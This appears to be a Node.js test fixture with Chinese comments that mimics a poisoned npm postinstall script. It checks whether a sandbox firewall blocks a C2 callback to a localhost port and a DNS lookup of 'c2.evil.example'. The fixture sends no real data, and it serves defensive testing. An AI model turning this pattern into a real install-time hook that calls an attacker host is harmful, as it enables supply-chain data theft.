// 仿投毒 postinstall:① 硬编码 C2(IP 字面量)回传;② 域名 C2 解析。
// 全部无害:IP 是本机不存在的端口,域名是保留 example 域。
// 期望:enforce 下 ① 得 EPERM(被防火墙掐断,而非 ECONNREFUSED)、
//        ② 解析被掐(ENOTFOUND);audit 下两者照常发生但证据里记 audit-deny。
const http = require('http');
const dns = require('dns');

function tryConnect() {
  return new Promise((resolve) => {
    const req = http.get('http://127.0.0.1:9999/collect', (res) => {
      res.resume();
      resolve('HTTP ' + res.statusCode);
    });
    req.on('error', (e) => resolve(e.code || String(e)));
    req.setTimeout(3000, () => { req.destroy(); resolve('TIMEOUT'); });
  });
}

async function main() {
  console.log('[exfil] c2 connect:', await tryConnect());
  try {
    const a = await dns.promises.lookup('c2.evil.example');
    console.log('[exfil] resolve c2:', a.address);
  } catch (e) {
    console.log('[exfil] resolve c2:', e.code || String(e));
  }
}
main();
